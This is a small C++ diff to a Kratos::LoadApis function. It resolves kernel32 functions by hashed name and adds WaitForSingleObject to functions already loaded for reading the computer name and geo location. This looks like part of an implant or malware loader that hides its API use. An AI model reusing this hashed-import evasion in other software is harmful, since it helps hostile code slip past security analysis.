@@ -63,7 +63,7 @@ BOOL Kratos::LoadApis( ) {
 		this->apis.MultiByteToWideChar   = ( decltype ( this->apis.MultiByteToWideChar   ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "MultiByteToWideChar"   ) );
 		this->apis.GetUserDefaultGeoName = ( decltype ( this->apis.GetUserDefaultGeoName ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetUserDefaultGeoName" ) );
 		this->apis.GetComputerNameExW    = ( decltype ( this->apis.GetComputerNameExW    ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "GetComputerNameExW"    ) );
-
+		this->apis.WaitForSingleObject   = ( decltype ( this->apis.WaitForSingleObject   ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA( "WaitForSingleObject"    ) );
 	}
 	else { return FALSE; }
 	DEBUG_LOG( "[+] Loaded Kernel32" );
